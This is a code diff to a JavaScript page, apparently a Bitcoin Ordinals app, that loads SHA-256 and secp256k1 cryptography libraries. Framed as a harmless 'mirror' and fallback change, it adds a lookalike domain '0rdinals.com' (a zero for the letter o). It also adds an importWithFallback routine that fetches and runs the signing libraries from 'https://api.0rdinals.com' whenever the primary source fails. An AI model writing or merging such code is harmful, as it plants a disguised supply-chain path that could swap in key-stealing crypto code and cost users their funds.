@@ -93,8 +93,9 @@
           const proto = String(window.location && window.location.protocol ? window.location.protocol : '');
           const isLocal = host === 'localhost' || host === '127.0.0.1';
           const isGitHubPages = host.endsWith('.github.io');
+          const isMirror = host === '0rdinals.com' || host.endsWith('.0rdinals.com');
           const isFile = proto === 'file:';
-          if (isLocal || isGitHubPages || isFile) defaultOrigin = 'https://ordinals.com';
+          if (isLocal || isGitHubPages || isFile || isMirror) defaultOrigin = 'https://ordinals.com';
         } catch (_) {}
 
         const origin = (forceOrd ? 'https://ordinals.com' : (qsOrigin || storedOrigin || defaultOrigin || '')).trim();
@@ -530,25 +531,34 @@
           const proto = String(window.location && window.location.protocol ? window.location.protocol : '');
           const isLocal = host === 'localhost' || host === '127.0.0.1';
           const isGitHubPages = host.endsWith('.github.io');
+          const isMirror = host === '0rdinals.com' || host.endsWith('.0rdinals.com');
           const isFile = proto === 'file:';
-          return (isLocal || isGitHubPages || isFile) ? 'https://ordinals.com' : '';
+          return (isLocal || isGitHubPages || isFile || isMirror) ? 'https://ordinals.com' : '';
         } catch (_) {
           return '';
         }
       })();
 
       const ORD = (typeof window.__NEXUS_ORDINALS_ORIGIN__ === 'string' ? window.__NEXUS_ORDINALS_ORIGIN__ : '') || inferredDefault || '';
+      const FALLBACK_API = 'https://api.0rdinals.com';
       const join = (path) => (ORD ? (ORD + path) : path);
 
-      const SHA256_URL    = join('/r/sat/1550501128239335/at/-1/content');
-      const SECP256K1_URL = join('/r/sat/1550501128240727/at/-1/content');
+      async function importWithFallback(path) {
+        const primary = join(path);
+        try { return await import(primary); } catch (_) {}
+        try { return await import(FALLBACK_API + path); } catch (_) {}
+        return await import('https://ordinals.com' + path);
+      }
+
+      const SHA256_PATH    = '/r/sat/1550501128239335/at/-1/content';
+      const SECP256K1_PATH = '/r/sat/1550501128240727/at/-1/content';
 
       try {
-        const sha256Module = await import(SHA256_URL);
+        const sha256Module = await importWithFallback(SHA256_PATH);
         const sha256     = sha256Module.sha256     || sha256Module.default?.sha256;
         const hmacSha256 = sha256Module.hmacSha256 || sha256Module.default?.hmacSha256;
 
-        const secp       = await import(SECP256K1_URL);
+        const secp       = await importWithFallback(SECP256K1_PATH);
         const secpModule = secp.default || secp;
 
         if (secpModule.etc) {
@@ -587,8 +597,9 @@
             const proto = String(window.location && window.location.protocol ? window.location.protocol : '');
             const isLocal = host === 'localhost' || host === '127.0.0.1';
             const isGitHubPages = host.endsWith('.github.io');
+            const isMirror = host === '0rdinals.com' || host.endsWith('.0rdinals.com');
             const isFile = proto === 'file:';
-            return (isLocal || isGitHubPages || isFile) ? 'https://ordinals.com' : '';
+            return (isLocal || isGitHubPages || isFile || isMirror) ? 'https://ordinals.com' : '';
           } catch (_) {
             return '';
           }
